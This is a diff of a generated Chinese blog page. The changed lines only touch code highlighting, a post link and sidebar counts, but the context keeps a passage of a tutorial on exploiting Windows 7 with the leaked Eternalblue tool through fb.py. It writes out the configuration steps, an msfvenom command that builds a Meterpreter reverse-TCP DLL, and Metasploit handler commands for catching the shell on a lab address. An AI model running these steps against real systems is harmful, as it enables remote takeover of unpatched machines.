@@ -388,7 +388,7 @@
 <p>运行fb.py进行交易(千万要注意要是<strong>python2.6</strong>，不是2.7，不然会报错)<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">fb</span><span class="selector-class">.py</span></div></pre></td></tr></table></figure></p>
 <p>注：在一般情况下需要在工具根目录下创建<strong>listeningposts</strong>文件夹，否则可能会报错。<br>开始使用，就按照他的要求来填写就没啥问题<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="number">172.16</span><span class="meta">.12</span><span class="meta">.3</span>  //目标<span class="built_in">IP</span></div><div class="line"><span class="number">172.16</span><span class="meta">.11</span><span class="meta">.2</span>  //本机<span class="built_in">IP</span></div><div class="line"></div><div class="line">no           //取消重定向</div><div class="line"><span class="symbol"></span></div><div class="line">d:\logs      //指定日志文件目录</div></pre></td></tr></table></figure></p>
 <p><img src="/images/2017 4 27/02.png" width="300" heigth=""><br><figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>            <span class="comment">//创建一个新项目</span></div><div class="line">Test_Win7    <span class="comment">//项目名称</span></div><div class="line"><span class="keyword">Yes</span>          <span class="comment">//确认路径</span></div></pre></td></tr></table></figure></p>
-<p><img src="/images/2017 4 27/03.png" width="300" heigth=""><br><img src="/images/2017 4 27/04.png" width="300" heigth=""><br>到这里，基本信息配置完成了；正式启动脚本，继续配置，使用第一个插件“以太之心”(名字我瞎比乱取的)<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">use</span> Eternalblue</div></pre></td></tr></table></figure></p>
+<p><img src="/images/2017 4 27/03.png" width="300" heigth=""><br><img src="/images/2017 4 27/04.png" width="300" heigth=""><br>到这里，基本信息配置完成了；正式启动脚本，继续配置，使用第一个插件“以太之心”(名字我瞎比乱取的)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">use</span> <span class="title">Eternalblue</span></div></pre></td></tr></table></figure></p>
 <p><strong>注意</strong>：选择Win 7操作系统64位、FB传输方式，其他信息默认回车<br><img src="/images/2017 4 27/05.png" width="300" heigth=""><br><img src="/images/2017 4 27/06.png" width="300" heigth=""><br><img src="/images/2017 4 27/07.png" width="300" heigth=""><br><img src="/images/2017 4 27/08.png" width="300" heigth=""><br><img src="/images/2017 4 27/09.png" width="300" heigth=""><br>出现Eternalblue Succeeded时表示脚本设置成功。</p>
 <h4 id="u914D_u7F6EMetasploit"><a href="#u914D_u7F6EMetasploit" class="headerlink" title="配置Metasploit"></a>配置Metasploit</h4><p>打开Metasploit，使用<strong>Everything</strong>搜索并使用<strong>XShell</strong>连接到Kali（或者直接在kali下运行Metasploit）<br><img src="/images/2017 4 27/10.png" width="300" heigth=""><br>通过Kali生成恶意dll，命令参数可以如下<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span> LPORT=<span class="number">12399</span> -f dll &gt;win.dll</div></pre></td></tr></table></figure></p>
 <p><img src="/images/2017 4 27/11.png" width="300" heigth=""><br>这时，<strong>/home</strong>目录下生成了名为win.dll的文件，设置TCP监听端口，用于接收攻击成功后返回的shell<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">msfconsole</div><div class="line"><span class="keyword">use</span> exploit/multi/<span class="keyword">handler</span>  //使用监听模块</div><div class="line"><span class="keyword">set</span> payload windows/x64/meterpreter/reverse_tcp</div><div class="line"><span class="keyword">show</span> options</div><div class="line"><span class="keyword">set</span> LHOST <span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span></div><div class="line"><span class="keyword">set</span> LPORT <span class="number">12399</span></div><div class="line">run</div></pre></td></tr></table></figure></p>
@@ -439,6 +439,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/05/03/CSGO还原1-6一键购买/" rel="prev" title="CSGO还原1.6一键购买">
+                CSGO还原1.6一键购买 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -510,7 +514,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">11</span>
+              <span class="site-state-item-count">12</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -518,7 +522,7 @@
           
             <div class="site-state-item site-state-categories">
               
-                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-count">10</span>
                 <span class="site-state-item-name">分类</span>
               
             </div>
@@ -527,7 +531,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-count">12</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
